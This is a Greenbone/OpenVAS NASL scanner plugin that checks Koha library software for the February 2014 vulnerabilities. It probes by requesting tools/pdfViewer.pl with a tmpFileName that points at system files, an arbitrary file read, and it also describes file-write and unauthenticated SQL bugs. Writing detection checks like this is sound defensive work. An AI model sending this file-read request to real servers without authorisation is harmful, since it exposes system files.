if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.103904" );
	script_cve_id( "CVE-2014-1922", "CVE-2014-1923", "CVE-2014-1924", "CVE-2014-1925" );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_version( "2021-04-16T06:57:08+0000" );
	script_name( "Koha Multiple Vulnerabilities" );
	script_xref( name: "URL", value: "http://koha-community.org/security-release-february-2014/" );
	script_tag( name: "last_modification", value: "2021-04-16 06:57:08 +0000 (Fri, 16 Apr 2021)" );
	script_tag( name: "creation_date", value: "2014-02-10 15:39:58 +0100 (Mon, 10 Feb 2014)" );
	script_category( ACT_ATTACK );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_family( "Web application abuses" );
	script_copyright( "Copyright (C) 2014 Greenbone Networks GmbH" );
	script_dependencies( "find_service.sc", "no404.sc", "webmirror.sc", "DDI_Directory_Scanner.sc", "os_detection.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 80 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_tag( name: "vuldetect", value: "Try to read a local file via tools/pdfViewer.pl." );
	script_tag( name: "insight", value: "Bug 11660: tools/pdfViewer.pl could be used to read arbitrary files on the server

Bug 11661: the staff interface help editor could be used to modify or create arbitrary
files on the server with the privileges of the Apache user

Bug 11662: member-picupload.pl could be used to write to arbitrary files on the server with
the privileges of the Apache user

Bug 11666: the MARC framework import/export function did not require authentication, and could
be used to perform unexpected SQL commands" );
	script_tag( name: "solution", value: "Updates are available." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "summary", value: "Koha is prone to multiple vulnerabilities." );
	script_tag( name: "affected", value: "Koha
< 3.14.3
< 3.12.10
< 3.10.13
< 3.8.23" );
	exit( 0 );
}
require("misc_func.inc.sc");
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("list_array_func.inc.sc");
require("host_details.inc.sc");
require("os_func.inc.sc");
port = http_get_port( default: 80 );
files = traversal_files();
for dir in nasl_make_list_unique( "/", http_cgi_dirs( port: port ) ) {
	if(dir == "/"){
		dir = "";
	}
	url = dir + "/";
	res = http_get_cache( item: url, port: port );
	if(ContainsString( res, "Log in to Koha" )){
		for file in keys( files ) {
			url = dir + "/cgi-bin/koha/tools/pdfViewer.pl?tmpFileName=/" + files[file];
			if(http_vuln_check( port: port, url: url, pattern: file )){
				report = http_report_vuln_url( port: port, url: url );
				security_message( port: port, data: report );
				exit( 0 );
			}
		}
	}
}
exit( 0 );

